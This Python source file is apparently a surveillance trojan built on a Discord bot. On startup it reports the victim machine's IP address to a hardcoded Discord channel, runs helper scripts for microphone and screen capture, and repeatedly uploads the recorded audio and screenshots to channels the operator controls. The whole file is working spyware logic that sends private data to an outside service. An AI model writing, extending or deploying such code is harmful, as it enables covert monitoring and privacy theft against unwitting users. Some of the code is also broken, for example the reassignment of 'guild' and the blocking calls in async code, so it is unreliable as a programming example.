import discord
from discord.ext import commands
import os
import socket
import time
import subprocess
from screen import Screenshot, Microphone
from dotenv import load_dotenv
load_dotenv(".env")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=';', intents=intents)
guild = "1198070162432200865"
screenshot_channel = "1209205802032955413"
microphone_channel = "1209237919592615937"
connect_channel = "1209247219874668638"

Microphone = Microphone()
Screenshot = Screenshot()

async def listen():
    while True:
        runMic = os.getenv('runMic')
        runScreen = os.getenv('runScreen')
        
        if runMic == "True":
            mic_path = f"files\\{time.strftime('%H:%M:%S')}.wav"
            guild = await bot.fetch_guild(guild)
            channel = await guild.fetch_channel(microphone_channel)

            with open(mic_path, "rb") as mic_file:
                await channel.send(file=discord.File(mic_file, mic_path))
            
            Microphone.update_env('runMic', 'False')

        if runScreen == "True":
            screenshot_path = f"files\\{time.strftime('%H:%M:%S')}.png"
            guild = await bot.fetch_guild(guild)
            channel = await guild.fetch_channel(screenshot_channel)

            with open(screenshot_path, 'rb') as screenshot_file:
                await channel.send(file=discord.File(screenshot_file, screenshot_path))
            
            Screenshot.update_env('runScreen', 'False')

        time.sleep(0.1)

@bot.event
async def on_ready():
    guild = await bot.fetch_guild(guild)
    channel = await guild.fetch_channel(connect_channel)

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    await channel.send(f"{ip_address} connected at {time.strftime('%H:%M:%S')}")

    subprocess.run(["python", "mic_sender.py"])
    subprocess.run(["python", "screen_sender.py"])
    await listen()

bot.run(os.getenv("TOKEN"))